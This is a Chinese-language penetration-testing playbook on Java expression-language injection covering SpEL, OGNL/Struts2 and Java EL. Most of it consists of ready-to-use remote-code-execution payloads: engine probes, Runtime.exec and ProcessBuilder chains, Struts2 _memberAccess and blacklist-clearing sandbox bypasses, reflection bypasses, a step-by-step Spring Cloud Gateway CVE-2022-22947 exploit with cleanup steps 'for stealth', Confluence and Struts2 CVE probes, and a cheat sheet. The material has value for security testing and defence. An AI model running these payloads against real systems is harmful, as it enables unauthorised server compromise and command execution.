---

phase: webapp
vuln_class: [ssti, injection]
title: EL 表达式注入测试
summary: Java 系的表达式注入（SpEL / OGNL / Java EL）。先靠三个探针定引擎，再按引擎选 RCE 原语和沙箱绕过。判据是「用户输入进了表达式求值」。
---

# EL 表达式注入测试

SSTI 通用识别（Jinja2/Twig/Mako/EJS/ERB）见 [[web/漏洞分类/注入类/服务端注入总入口.md|server-side.md]]。

## 0. 判据速查

| 现象 | 说明 | 去哪节 |
|---|---|---|
| `${7*7}` 返回 `49` | SpEL 或 Java EL | §1 |
| `%{7*7}` 返回 `49` | OGNL（Struts2） | §1 |
| `#{7*7}` 返回 `49` | SpEL 备选语法或 JSF EL | §1 |
| 报错含 `SpelEvaluationException` | SpEL | §2 |
| 报错含 `ognl.OgnlException` | OGNL | §3 |
| 报错含 `javax.el.ELException` | Java EL | §4 |
| 目标有 `/actuator/gateway` | Spring Cloud Gateway，CVE-2022-22947 | §2.6 |
| `T()` 被禁 | `SimpleEvaluationContext` 沙箱，走反射 | §2.7 |
| Struts2 且 `%{}` 被拦 | `_memberAccess` / 黑名单清除 | §3.2、§3.3 |
| 目标是 Confluence Server | CVE-2021-26084 | §3.5 |

**核心判据**：和 SSTI 一样 —— 用户输入是否进了表达式求值器。**先定引擎**，因为三种语言的 RCE 原语完全不同（SpEL 用 `T()`、OGNL 用 `@`、Java EL 用反射）。

---

## 1. 引擎识别

```text
${7*7}                        → 49 = SpEL / OGNL / Java EL
#{7*7}                        → 49 = SpEL 备选语法 或 JSF EL
%{7*7}                        → 49 = OGNL（Struts2）
${T(java.lang.Math).random()} → 随机浮点 = 确认 SpEL
%{#context}                   → 对象 dump = 确认 OGNL
```

**消歧表**：

| `${7*7}` 响应 | `%{7*7}` 响应 | 引擎 |
|---|---|---|
| 49 | 字面 `%{7*7}` | SpEL 或 Java EL |
| 字面 `${7*7}` | 49 | OGNL（Struts2） |
| 49 | 49 | 两者都可能活着 |

`${}` 命中的两个引擎再靠**报错信息**分（见 §0 表），或者直接试 `T(...)` —— SpEL 认，Java EL 不认。

---

## 2. SpEL（Spring Expression Language）

### 2.1 出现位置

- `@Value("${...}")` 注解
- Spring Security 表达式（`@PreAuthorize`）
- Spring Cloud Gateway 的 route predicate / filter
- Thymeleaf `th:text="${...}"`（配合 `__${...}__` 预处理时）
- Spring Data 带 SpEL 的 `@Query`

### 2.2 基础 RCE

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### 2.3 带回显（Commons IO）

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### 2.4 带回显（Spring StreamUtils）

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### 2.5 Runtime 被拦 → ProcessBuilder

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

**distroless 容器没有 `/bin/sh`** 时，`exec` 类都白费，改读文件（见 §2.8）。

### 2.6 Spring Cloud Gateway（CVE-2022-22947）

通过 actuator 加一条带 SpEL 的恶意路由：

```bash
# 1. 加路由，SpEL 在 filter 参数里（带输出捕获）
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# 2. 刷新路由
POST /actuator/gateway/refresh

# 3. 触发
GET /hackpath
# 响应头 Result 里就是命令输出

# 4. 清理（隐蔽性重要）
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

**判据**：`/actuator/gateway/routes` 可读写。actuator 端点暴露本身就该是发现项。

### 2.7 沙箱绕过（`SimpleEvaluationContext`）

`SimpleEvaluationContext` 限制 `T()` 操作符时，走反射：

```java
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

拆开看：`''.class` 拿 `String.class`，`forName` 加载 `Runtime`，`getMethod('getRuntime').invoke(null)` 拿实例，`getMethod('exec', String.class).invoke(instance, 'id')` 执行。全程不用 `T()`。

### 2.8 无 shell 时读文件

见 [[web/漏洞分类/注入类/代码执行与命令执行.md|server-side-exec.md §7.4]] —— `FileCopyUtils.copyToByteArray` / `StreamUtils.copyToString` / `Files.readAllBytes`，不需要拉进程。

---

## 3. OGNL（Object-Graph Navigation Language）

### 3.1 出现位置

- Apache Struts2 —— 主要消费者
- Confluence Server —— 某些请求路径用 OGNL
- 任何用 `ognl.Ognl.getValue()` / `setValue()` 的 Java 应用

### 3.2 基础 RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

注意 OGNL 用 `@类@方法`，不是 `T()`。

### 3.3 Struts2 沙箱绕过 —— `_memberAccess`

Struts2 用 `SecurityMemberAccess` 限制 OGNL。经典绕过是清掉限制：

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

这段是完整版：清限制 → 按 OS 选命令数组 → `ProcessBuilder` 启动 → 把 stdout 拷进响应输出流。

### 3.4 后续版本：清黑名单

较新 Struts2 用类/包黑名单，清掉 `excludedClasses` 和 `excludedPackageNames`：

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### 3.5 关键 Struts2 CVE 与注入位置

| CVE | 向量 | payload 位置 |
|---|---|---|
| S2-045（CVE-2017-5638） | Content-Type 头 | `%{...}` 塞进 Content-Type |
| S2-046（CVE-2017-5638） | multipart 文件名 | OGNL 在上传文件名 |
| S2-016（CVE-2013-2251） | `redirect:` / `redirectAction:` 前缀 | URL 参数 |
| S2-048（CVE-2017-9791） | Struts Showcase | ActionMessage 带 OGNL |
| S2-057（CVE-2018-11776） | namespace OGNL | URL 路径 |

**S2-045 最值得先试** —— 只要目标用 Struts2，改一个请求头就行，不需要找参数。

### 3.6 Confluence（CVE-2021-26084）

通过 `queryString` 或 action 参数注入 OGNL：

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL 解码：\u0027+{3*3}+\u0027
# 响应里有 9 → 确认
# 再用 Runtime.exec 升级到 RCE
```

`\u0027` 是单引号，用来闭合原模板里的字符串，`{3*3}` 被当 OGNL 求值。

---

## 4. Java EL（JSP / JSF）

### 4.1 出现位置

- JSP 页面的 `${expression}` 和 `#{expression}`
- JSF（JavaServer Faces）的 value / method 绑定
- 自定义标签库

### 4.2 RCE payload

```java
// 直接 Runtime
${Runtime.getRuntime().exec("id")}

// 经 pageContext（JSP）
${pageContext.request.getServletContext().getClassLoader()}

// 反射式（Runtime 被拦时）
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

Java EL 比 SpEL 弱：**没有 `T()`**，也不能直接调静态方法。所以基本都要走反射。

---

## 5. 测试流程

```
输入被反射，且 ${7*7} 返回 49？
├── 是 Java 应用？
│   ├── Struts2？ → 试 %{...} OGNL
│   │   └── 先试 S2-045：Content-Type 里塞 %{...}
│   ├── Spring？ → 试 T(java.lang.Runtime) SpEL
│   │   └── 查 /actuator/gateway（CVE-2022-22947）
│   ├── Confluence？ → 走 action 参数的 OGNL
│   └── JSP/JSF？ → 试 Java EL 反射 payload
│
├── 报错暴露框架？
│   ├── "ognl.OgnlException"        → OGNL
│   ├── "SpelEvaluationException"   → SpEL
│   └── "javax.el.ELException"      → Java EL
│
└── 被沙箱挡？
    ├── OGNL：清 _memberAccess / excludedClasses
    ├── SpEL：SimpleEvaluationContext 走反射
    └── 换执行方式（ProcessBuilder、ScriptEngine）
```

---

## 6. 速查

```text
# SpEL RCE
${T(java.lang.Runtime).getRuntime().exec("id")}

# SpEL 带回显
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}

# OGNL RCE（Struts2）
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL 沙箱绕过
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE（反射式）
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 探针
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947
POST /actuator/gateway/routes/x    → filter args 里放 SpEL
POST /actuator/gateway/refresh
```

---

## 7. 纪律

- **先定引擎再打 payload**。SpEL 用 `T()`、OGNL 用 `@`、Java EL 只能反射 —— 混用必然失败。三个探针（`${7*7}` / `%{7*7}` / `#{7*7}`）一次定下来。
- **Struts2 先试 S2-045**。改 Content-Type 头比找注入参数快得多。
- **`${}` 和 `%{}` 都返回 49 时别急**。可能两套引擎都活着，也可能只是其中一个把另一个当字面量透传 —— 用 `T(...)` 或 `#context` 精确区分。
- **沙箱不是终点**。OGNL 清 `_memberAccess`、SpEL 走反射，两套都有成熟绕过。
- **distroless 容器里 exec 是死路**。没有 `/bin/sh` 时改读文件，别在 `Runtime.exec` 上耗时间。
- **actuator 暴露本身就是发现项**。`/actuator/gateway/routes` 可写 = 直接 RCE，不需要别的漏洞。
- **报的是「执行了命令 / 读到了文件」不是「有表达式注入」**。
